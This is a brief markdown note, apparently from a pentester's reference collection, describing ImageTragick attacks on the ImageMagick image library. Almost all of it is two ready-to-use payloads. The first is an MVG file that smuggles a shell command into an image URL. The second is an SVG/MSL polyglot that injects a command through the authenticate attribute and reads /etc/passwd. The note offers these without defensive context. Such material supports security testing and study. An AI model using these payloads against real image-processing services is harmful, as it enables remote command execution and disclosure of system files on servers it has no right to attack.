## Definition
__ImageTragick__ are a set of attacks that can be run in the well-know [Imagemagick](</General Info/Tecnologias Web/Imagemagick.md>).

## Common attacks
- .MVG file attack: 
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";|ls "-la)'
pop graphic-context
```
- .SVG shell injection via PDF password (SVG MSL Polyglot file):
```
<image authenticate='ff" `echo $(id)> ./0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
	</image>
```
